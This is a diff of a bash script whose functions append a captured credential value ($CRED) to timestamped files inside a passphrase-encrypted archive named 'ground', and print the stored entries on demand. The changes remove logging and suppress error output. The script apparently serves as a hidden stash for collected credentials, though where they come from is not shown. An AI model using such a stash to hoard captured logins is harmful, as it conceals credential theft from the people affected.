@@ -55,8 +55,8 @@ function auto() {
   if [ -f "ground.tar.gz.gpg" ]; then
     echo "[+] Ground exists, unpacking"
 
-    echo "$PASSWORD" | gpg --batch --yes --passphrase-fd 0 ground.tar.gz.gpg 2>/dev/null >> Plug.log
-    tar -xzvf ground.tar.gz 2>/dev/null >> Plug.log
+    echo "$PASSWORD" | gpg --batch --yes --passphrase-fd 0 ground.tar.gz.gpg 2>/dev/null
+    tar -xzvf ground.tar.gz 2>/dev/null
     rm -f ground.tar.gz
 
     echo "$CRED" >> "$date".txt
@@ -64,7 +64,7 @@ function auto() {
 
     tar czf ground.tar.gz ground/ 2>/dev/null
     rm -rf ground/
-    echo "$PASSWORD" | gpg -c --batch --yes --passphrase-fd 0 ground.tar.gz
+    echo "$PASSWORD" | gpg -c --batch --yes --passphrase-fd 0 ground.tar.gz 2>/dev/null
     rm -f ground.tar.gz
     chmod 700 ground.tar.gz.gpg
 
@@ -75,9 +75,9 @@ function auto() {
     echo "$CRED" >> "$date".txt
     mv "$date".txt ground
 
-    tar czf ground.tar.gz ground/
+    tar czf ground.tar.gz ground/ 2>/dev/null
     rm -rf ground/
-    echo "$PASSWORD" | gpg -c --batch --yes --passphrase-fd 0 ground.tar.gz
+    echo "$PASSWORD" | gpg -c --batch --yes --passphrase-fd 0 ground.tar.gz 2>/dev/null
     rm -f ground.tar.gz
     chmod 700 ground.tar.gz.gpg
 
@@ -86,20 +86,20 @@ function auto() {
 
 function man() {
     # Iterate through files, return unencrypted files contents seperated by Newline
-  echo "$PASSWORD" | gpg --batch --yes --passphrase-fd 0 ground.tar.gz.gpg  >> Plug.log
-  tar -xzvf ground.tar.gz 2>/dev/null >> Plug.log
+  echo "$PASSWORD" | gpg --batch --yes --passphrase-fd 0 ground.tar.gz.gpg 2>/dev/null
+  tar -xzvf ground.tar.gz 2>/dev/null
   rm -f ground.tar.gz
 
   for FILE in ground/*;
   do
-    val=$(echo $FILE | tr -dc '0-9')
+    val=$(echo "$FILE" | tr -dc '0-9')
     date=$(date -r "$val" '+%m/%d/%Y %H:%M:%S')
     creds=$(cat "$FILE")
     printf "${BLUE}%s |\t%s\n${NC}" "$date" "$creds"
   done
 
-  #tar czf ground.tar.gz ground/ 2>/dev/null >> Plug.log
-  #rm -rf ground/
-  #echo "$PASSWORD" | gpg -c --batch --yes --passphrase-fd 0 ground.tar.gz 2>/dev/null >> Plug.log
-  #rm -f ground.tar.gz
+  tar czf ground.tar.gz ground/ 2>/dev/null
+  rm -rf ground/
+  echo "$PASSWORD" | gpg -c --batch --yes --passphrase-fd 0 ground.tar.gz 2>/dev/null
+  rm -f ground.tar.gz
 }
